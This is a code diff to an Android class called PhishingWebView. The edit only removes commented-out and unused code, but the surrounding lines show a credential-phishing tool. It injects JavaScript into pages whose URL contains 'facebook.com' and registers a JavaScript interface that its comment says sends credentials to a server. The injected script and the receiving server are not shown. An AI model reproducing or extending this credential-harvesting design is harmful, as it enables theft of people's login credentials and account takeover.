@@ -48,7 +48,6 @@ public class PhishingWebView extends Activity {
         WV.getSettings().setDisplayZoomControls(false);
         // Use Custom WebViewClient to execute JavaScript-Code onPageFinished
         WV.setWebViewClient(new MyWebViewClient());
-        // WV.setWebChromeClient(new MyWebChromeClient());
         // add JSInterface to send credentials to server ( can also be done via xhr )
         WV.addJavascriptInterface(new MyJavascriptInterface(), "myinterface");
 
@@ -84,21 +83,6 @@ public class PhishingWebView extends Activity {
             if (url.contains("facebook.com")) {
                 view.evaluateJavascript(jscode, null);
             }
-        }
-
-        /*
-        @Override
-        public void onUnhandledKeyEvent(WebView view, KeyEvent event) {
-            Log.i("PHISH", event.toString() + " was pressed!");
-            super.onUnhandledKeyEvent(view, event);
-        }
-        */
-    }
-
-    private class MyWebChromeClient extends WebChromeClient {
-        @Override
-        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
-            return super.onJsAlert(view, url, message, result);
         }
     }
 
